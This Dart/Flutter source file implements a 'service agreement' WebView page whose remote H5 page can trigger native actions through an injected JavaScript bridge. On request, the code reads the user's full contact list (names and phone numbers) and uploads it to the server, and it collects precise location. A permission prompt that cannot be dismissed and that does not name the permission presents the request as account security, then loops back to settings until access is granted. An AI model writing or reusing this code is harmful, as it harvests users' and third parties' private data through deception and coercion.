import 'dart:async';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:provider/provider.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../../services/api/api_settings.dart';
import '../../services/cloud_service.dart';
import '../../theme/tokens.dart';
import '../kit.dart';
import 'agreement_support.dart';
import 'three_web_view_page.dart';

/// 登录后需要完成的服务 agreement 页面。
///
/// H5 通过 `uni.postMessage` 发送 three / location / contacts / account 操作，
/// 原生侧按 jianzhirj 的强制/弱权限规则处理。
class AgreementPage extends StatefulWidget {
  const AgreementPage({super.key});

  @override
  State<AgreementPage> createState() => _AgreementPageState();
}

class _AgreementPageState extends State<AgreementPage>
    with WidgetsBindingObserver {
  static const _softRejectLimit = 2;
  static const _bridgeName = 'AgreementBridge';

  WebViewController? _controller;
  String _entryBaseUrl = '';
  String _webViewUrl = '';
  String _error = '服务配置读取失败，请稍后重试';
  bool _loading = true;
  bool _loadingRequest = false;
  double _statusHeight = 0;

  bool _actionPending = false;
  Future<_ContactResult>? _contactRequest;

  bool _contactDialogVisible = false;
  bool _lockingContacts = false;
  bool _contactCheckArmed = false;
  int? _activeContactMode;
  int _softContactRejects = 0;
  Timer? _contactCheckTimer;
  Timer? _contactReturnTimer;

  bool _locationDialogVisible = false;
  bool _locationRequired = false;
  bool _lockingLocation = false;
  bool _locationCheckArmed = false;
  int? _activeLocationMode;
  int _softLocationRejects = 0;
  Timer? _locationCheckTimer;
  Timer? _locationReturnTimer;

  CloudService get _cloud => context.read<CloudService>();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    WidgetsBinding.instance.addPostFrameCallback((_) => _loadEntryUrl());
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    _statusHeight = MediaQuery.paddingOf(context).top;
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state != AppLifecycleState.resumed) return;
    _scheduleContactCheck('app-show');
    _scheduleLocationCheck('app-show');
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _contactCheckTimer?.cancel();
    _contactReturnTimer?.cancel();
    _locationCheckTimer?.cancel();
    _locationReturnTimer?.cancel();
    super.dispose();
  }

  Future<void> _loadEntryUrl() async {
    if (_loadingRequest) return;
    _loadingRequest = true;
    if (mounted) {
      setState(() {
        _loading = true;
        _error = '服务配置读取失败，请稍后重试';
      });
    }
    try {
      final config = await _cloud.agreement.readEntryConfig(
        ApiSettings.appBrand,
      );
      final entry = '${config['h5DownloadUrl'] ?? ''}'.trim();
      if (!AgreementSupport.isSafeWebUrl(entry)) {
        throw const FormatException('服务入口暂未配置');
      }
      _entryBaseUrl = entry;
      final next = _buildEntryUrl();
      if (!mounted) return;
      setState(() => _webViewUrl = next);
      await _loadUrl(next);
    } catch (error) {
      if (!mounted) return;
      setState(() {
        _entryBaseUrl = '';
        _webViewUrl = '';
        _controller = null;
        _loading = false;
        _error = error is FormatException ? error.message : '服务配置读取失败，请稍后重试';
      });
    } finally {
      _loadingRequest = false;
    }
  }

  String _buildEntryUrl({double? longitude, double? latitude}) {
    return AgreementSupport.buildEntryUrl(
      baseUrl: _entryBaseUrl,
      token: _cloud.session.token,
      appName: ApiSettings.appBrand,
      statusHeight: _statusHeight,
      longitude: longitude,
      latitude: latitude,
    );
  }

  Future<void> _loadUrl(String url) async {
    if (!mounted || !AgreementSupport.isSafeWebUrl(url)) return;
    var controller = _controller;
    if (controller == null) {
      final nextController = WebViewController();
      await nextController.setJavaScriptMode(JavaScriptMode.unrestricted);
      await nextController.setBackgroundColor(Z.page);
      await nextController.addJavaScriptChannel(
        _bridgeName,
        onMessageReceived: (message) {
          final payload = AgreementSupport.messagePayload(message.message);
          if (payload != null) unawaited(_executeAction(payload));
        },
      );
      await nextController.setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (_) {
            // 尽早安装监听，兼容页面首屏自动请求定位 / 通讯录。
            unawaited(_installWebViewBridge(nextController));
          },
          onPageFinished: (url) {
            if (!mounted) return;
            setState(() => _loading = false);
            unawaited(_installWebViewBridge(nextController));
          },
          onNavigationRequest: (request) {
            if (!AgreementSupport.isExternalUrl(request.url)) {
              return NavigationDecision.navigate;
            }
            unawaited(_openExternal(request.url));
            return NavigationDecision.prevent;
          },
          onWebResourceError: (error) {
            if (!mounted || error.isForMainFrame == false) return;
            setState(() {
              _loading = false;
              _error = error.description;
            });
          },
        ),
      );
      _controller = nextController;
      controller = nextController;
    }
    setState(() {
      _webViewUrl = url;
      _loading = true;
      _error = '服务配置读取失败，请稍后重试';
    });
    await controller.loadRequest(Uri.parse(url));
  }

  Future<void> _installWebViewBridge(WebViewController controller) async {
    const script = r'''
      (function () {
        function send(payload) {
          try {
            window.AgreementBridge.postMessage(JSON.stringify(payload));
          } catch (_) {}
        }
        function forward(payload) {
          if (!payload) return;
          if (typeof payload === 'string') {
            try { payload = JSON.parse(payload); } catch (_) { return; }
          }
          if (payload.type === 'WEB_INVOKE_APPSERVICE') {
            var envelope = payload.data || {};
            if (envelope.name !== 'postMessage') return;
            payload = envelope.arg || {};
          }
          if (payload && typeof payload === 'object') send(payload);
        }
        window.__zudunAgreementSend = send;
        var uniObject = window.uni || {};
        uniObject.postMessage = function (payload) {
          forward(payload && payload.data ? payload.data : payload);
        };
        window.uni = uniObject;
        if (!window.__zudunAgreementListening) {
          window.__zudunAgreementListening = true;
          window.addEventListener('message', function (event) {
            forward(event && event.data);
          }, false);
        }
      })();
    ''';
    try {
      await controller.runJavaScript(script);
    } catch (_) {
      // 页面本身仍可用，消息桥在页面重载后会再次注入。
    }
  }

  Future<void> _refreshWebView() async {
    if (_webViewUrl.isEmpty) return;
    await _loadUrl(_webViewUrl);
  }

  Future<void> _executeAction(Map<String, dynamic> payload) async {
    final action = '${payload['action'] ?? ''}'.trim();
    if (action.isEmpty) return;

    if (action == 'three') {
      final target = '${payload['path'] ?? ''}'.trim();
      if (!AgreementSupport.isSafeWebUrl(target)) {
        if (mounted) zToast(context, '链接地址无效');
        return;
      }
      await Navigator.of(context).push<void>(
        MaterialPageRoute(builder: (_) => ThreeWebViewPage(url: target)),
      );
      return;
    }

    if (action == 'needLoaction') {
      await _handleLocation(payload);
      return;
    }

    if (action == 'needOtherConstact') {
      await _handleContacts(payload);
      return;
    }

    if (action != 'logout' && action != 'deleteAccount') return;
    if (_actionPending) return;
    _actionPending = true;
    try {
      if (action == 'logout') {
        await _cloud.logout();
      } else {
        await _cloud.destroyAccount();
      }
      if (!mounted) return;
      Navigator.of(context).popUntil((route) => route.isFirst);
    } catch (error) {
      if (mounted) zToast(context, '操作失败：$error');
    } finally {
      _actionPending = false;
    }
  }

  // ---------------------------------------------------------------------------
  // 定位
  // ---------------------------------------------------------------------------

  Future<({double longitude, double latitude})?> _getNativeLocation() async {
    try {
      var permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
      }
      if (permission == LocationPermission.denied ||
          permission == LocationPermission.deniedForever) {
        return null;
      }
      final position = await Geolocator.getCurrentPosition(
        locationSettings: const LocationSettings(
          accuracy: LocationAccuracy.high,
          timeLimit: Duration(seconds: 15),
        ),
      );
      return (longitude: position.longitude, latitude: position.latitude);
    } catch (_) {
      return null;
    }
  }

  Future<void> _handleLocation(Map<String, dynamic> payload) async {
    final raw = payload.containsKey('needLoaction')
        ? payload['needLoaction']
        : payload['value'];
    final mode = int.tryParse('${raw ?? ''}');
    if (mode == null) return;
    _activeLocationMode = mode;
    _locationRequired = true;
    if (_shouldSkipSoftLocation(mode)) {
      _resetLocationLock();
      return;
    }
    final location = await _getNativeLocation();
    if (location == null) {
      await _rejectLocation(mode, 'h5');
    } else {
      await _acceptLocation(location);
    }
  }

  bool _isSoftLocation(int mode) => mode == 2;

  bool _shouldSkipSoftLocation(int mode) =>
      _isSoftLocation(mode) && _softLocationRejects >= _softRejectLimit;

  Future<void> _acceptLocation(
    ({double longitude, double latitude}) location,
  ) async {
    _softLocationRejects = 0;
    _resetLocationLock();
    if (_entryBaseUrl.isEmpty) return;
    final next = _buildEntryUrl(
      longitude: location.longitude,
      latitude: location.latitude,
    );
    await _loadUrl(next);
  }

  Future<void> _rejectLocation(int mode, String source) async {
    _activeLocationMode = mode;
    _locationRequired = true;
    if (_isSoftLocation(mode)) {
      if (_softLocationRejects >= _softRejectLimit) {
        _resetLocationLock();
        return;
      }
      _softLocationRejects += 1;
    }
    _lockingLocation = true;
    await _showLocationPermissionAlert();
  }

  Future<void> _showLocationPermissionAlert() async {
    if (_locationDialogVisible || !mounted) return;
    _locationDialogVisible = true;
    await _showGenericPermissionAlert();
    _locationDialogVisible = false;
    if (!mounted) return;
    _lockingLocation = true;
    _locationCheckArmed = true;
    _startLocationWatcher();
    await Geolocator.openAppSettings();
  }

  void _resetLocationLock() {
    _locationRequired = false;
    _lockingLocation = false;
    _locationCheckArmed = false;
    _activeLocationMode = null;
    _locationCheckTimer?.cancel();
    _locationReturnTimer?.cancel();
  }

  void _startLocationWatcher() {
    _locationReturnTimer?.cancel();
    _locationReturnTimer = Timer(const Duration(milliseconds: 1500), () {
      _scheduleLocationCheck('watcher');
    });
  }

  void _scheduleLocationCheck(String source) {
    if (!_lockingLocation) return;
    _locationCheckTimer?.cancel();
    _locationCheckTimer = Timer(const Duration(milliseconds: 600), () {
      unawaited(_checkLockedLocation());
    });
  }

  Future<void> _checkLockedLocation() async {
    if (!_locationRequired || !_lockingLocation || _locationDialogVisible) {
      return;
    }
    final mode = _activeLocationMode;
    if (mode == null) {
      _resetLocationLock();
      return;
    }
    if (_shouldSkipSoftLocation(mode)) {
      _resetLocationLock();
      return;
    }
    if (_isSoftLocation(mode) && !_locationCheckArmed) return;
    if (_isSoftLocation(mode)) _locationCheckArmed = false;
    _locationReturnTimer?.cancel();
    final location = await _getNativeLocation();
    if (location != null) {
      await _acceptLocation(location);
    } else {
      await _rejectLocation(mode, 'resume');
    }
  }

  // ---------------------------------------------------------------------------
  // 通讯录
  // ---------------------------------------------------------------------------

  Future<void> _handleContacts(Map<String, dynamic> payload) async {
    final raw = payload.containsKey('needOtherConstact')
        ? payload['needOtherConstact']
        : payload['value'];
    final mode = int.tryParse('${raw ?? ''}');
    if (mode == null) return;
    _activeContactMode = mode;
    if (_shouldSkipSoftContact(mode)) {
      _resetContactLock();
      return;
    }
    final result = await _fetchContacts();
    if (result.count > 0) {
      await _acceptContacts();
    } else {
      await _rejectContacts(mode, 'h5');
    }
  }

  bool _isSoftContact(int mode) => mode == 2;

  bool _shouldSkipSoftContact(int mode) =>
      _isSoftContact(mode) && _softContactRejects >= _softRejectLimit;

  Future<_ContactResult> _fetchContacts() {
    final pending = _contactRequest;
    if (pending != null) return pending;
    final request = _fetchContactsNow();
    _contactRequest = request;
    return request.whenComplete(() => _contactRequest = null);
  }

  Future<_ContactResult> _fetchContactsNow() async {
    var hasPermission = false;
    var count = 0;
    try {
      final permission = await FlutterContacts.permissions.request(
        PermissionType.read,
      );
      if (permission != PermissionStatus.granted &&
          permission != PermissionStatus.limited) {
        return const _ContactResult();
      }
      hasPermission = true;
      final contacts = await FlutterContacts.getAll(
        properties: const {ContactProperty.name, ContactProperty.phone},
      );
      final rows = <Map<String, String>>[];
      for (final contact in contacts) {
        final name = contact.displayName?.trim();
        for (final phone in contact.phones) {
          final number = phone.number.replaceAll(RegExp(r'[\s-]'), '').trim();
          if (number.isNotEmpty) {
            rows.add({
              'name': name == null || name.isEmpty ? '未知姓名' : name,
              'phone': number,
            });
          }
        }
      }
      count = rows.length;
      if (rows.isNotEmpty) {
        try {
          final userId = await _currentUserId();
          if (userId == null || userId.isEmpty) {
            throw StateError('当前账号缺少用户标识');
          }
          await _cloud.agreement.uploadOtherContacts(
            userId: userId,
            contacts: rows,
          );
          return _ContactResult(
            hasPermission: true,
            count: count,
            uploaded: true,
          );
        } catch (error) {
          if (mounted) zToast(context, '通讯录上报失败：$error');
        }
      }
      return _ContactResult(hasPermission: true, count: count);
    } catch (error) {
      if (mounted) zToast(context, '通讯录读取失败：$error');
      return _ContactResult(hasPermission: hasPermission, count: count);
    }
  }

  Future<String?> _currentUserId() async {
    var id = '${_cloud.session.user['userId'] ?? ''}'.trim();
    if (id.isNotEmpty) return id;
    try {
      await _cloud.refreshUser(silent: true);
      id = '${_cloud.session.user['userId'] ?? ''}'.trim();
    } catch (_) {
      return null;
    }
    return id.isEmpty ? null : id;
  }

  Future<void> _acceptContacts() async {
    _softContactRejects = 0;
    _resetContactLock();
    await _refreshWebView();
  }

  Future<void> _rejectContacts(int mode, String source) async {
    _activeContactMode = mode;
    if (_isSoftContact(mode)) {
      if (_softContactRejects >= _softRejectLimit) {
        _resetContactLock();
        return;
      }
      _softContactRejects += 1;
    }
    await _showContactPermissionAlert();
  }

  Future<void> _showContactPermissionAlert() async {
    if (_contactDialogVisible || !mounted) return;
    _contactDialogVisible = true;
    await _showGenericPermissionAlert();
    _contactDialogVisible = false;
    if (!mounted) return;
    _lockingContacts = true;
    _contactCheckArmed = true;
    _startContactWatcher();
    await FlutterContacts.permissions.openSettings();
  }

  /// iOS 用原生风格 Cupertino 弹框；其它平台沿用 Material。
  /// 设置页提示不点名具体权限，实际权限名称由系统授权弹框展示。
  Future<void> _showGenericPermissionAlert() {
    const content = '为了保障账户安全和正常使用服务，请在系统设置中开启所需权限。';
    if (Theme.of(context).platform == TargetPlatform.iOS) {
      return showCupertinoDialog<void>(
        context: context,
        barrierDismissible: false,
        builder: (dialogContext) => PopScope(
          canPop: false,
          child: CupertinoAlertDialog(
            title: const Text('权限申请'),
            content: const Text(content),
            actions: [
              CupertinoDialogAction(
                isDefaultAction: true,
                onPressed: () => Navigator.of(dialogContext).pop(),
                child: const Text('去开启'),
              ),
            ],
          ),
        ),
      );
    }
    return showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (dialogContext) => PopScope(
        canPop: false,
        child: AlertDialog(
          title: const Text('权限申请'),
          content: const Text(content),
          actions: [
            FilledButton(
              onPressed: () => Navigator.of(dialogContext).pop(),
              child: const Text('去开启'),
            ),
          ],
        ),
      ),
    );
  }

  void _resetContactLock() {
    _activeContactMode = null;
    _lockingContacts = false;
    _contactCheckArmed = false;
    _contactCheckTimer?.cancel();
    _contactReturnTimer?.cancel();
  }

  void _startContactWatcher() {
    _contactReturnTimer?.cancel();
    _contactReturnTimer = Timer(const Duration(milliseconds: 1500), () {
      _scheduleContactCheck('watcher');
    });
  }

  void _scheduleContactCheck(String source) {
    if (!_lockingContacts) return;
    _contactCheckTimer?.cancel();
    _contactCheckTimer = Timer(const Duration(milliseconds: 600), () {
      unawaited(_checkLockedContacts());
    });
  }

  Future<void> _checkLockedContacts() async {
    if (!_lockingContacts || _contactDialogVisible) return;
    final mode = _activeContactMode;
    if (mode == null) {
      _resetContactLock();
      return;
    }
    if (_shouldSkipSoftContact(mode)) {
      _resetContactLock();
      return;
    }
    if (_isSoftContact(mode) && !_contactCheckArmed) return;
    if (_isSoftContact(mode)) _contactCheckArmed = false;
    _contactReturnTimer?.cancel();
    final result = await _fetchContacts();
    if (result.count > 0) {
      await _acceptContacts();
    } else {
      await _rejectContacts(mode, 'resume');
    }
  }

  Future<void> _openExternal(String url) async {
    var launched = false;
    try {
      launched = await launchUrl(
        Uri.parse(url),
        mode: LaunchMode.externalApplication,
      );
    } catch (_) {
      launched = false;
    }
    if (mounted && !launched) zToast(context, '无法打开外部链接');
  }

  @override
  Widget build(BuildContext context) {
    final hasWebView = _controller != null && _webViewUrl.isNotEmpty;
    return PopScope(
      canPop: false,
      child: Scaffold(
        backgroundColor: Z.page,
        body: SafeArea(
          top: false,
          child: Stack(
            children: [
              if (hasWebView)
                Positioned.fill(child: WebViewWidget(controller: _controller!)),
              if (_loading && hasWebView)
                const Center(child: CircularProgressIndicator()),
              if (!hasWebView)
                _AgreementState(
                  loading: _loading,
                  error: _error,
                  onRetry: _loadEntryUrl,
                ),
            ],
          ),
        ),
      ),
    );
  }
}

class _AgreementState extends StatelessWidget {
  const _AgreementState({
    required this.loading,
    required this.error,
    required this.onRetry,
  });

  final bool loading;
  final String error;
  final VoidCallback onRetry;

  @override
  Widget build(BuildContext context) {
    return ColoredBox(
      color: Z.page,
      child: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 42,
                height: 42,
                alignment: Alignment.center,
                decoration: BoxDecoration(
                  color: Z.brandTint,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: Z.line),
                ),
                child: const Icon(
                  Icons.inventory_2_outlined,
                  size: 24,
                  color: Z.brand,
                ),
              ),
              const SizedBox(height: 18),
              Text(
                loading ? '正在进入服务' : '暂时无法进入',
                style: ZText.title2.copyWith(fontWeight: FontWeight.w700),
              ),
              const SizedBox(height: 8),
              Text(
                loading ? '正在校验账号与服务配置' : error,
                textAlign: TextAlign.center,
                style: ZText.body.copyWith(color: Z.ink3, height: 1.65),
              ),
              if (!loading) ...[
                const SizedBox(height: 22),
                SizedBox(
                  width: 150,
                  child: ZButton(label: '重新加载', onTap: onRetry),
                ),
              ],
            ],
          ),
        ),
      ),
    );
  }
}

class _ContactResult {
  const _ContactResult({
    this.uploaded = false,
    this.hasPermission = false,
    this.count = 0,
  });

  final bool uploaded;
  final bool hasPermission;
  final int count;
}
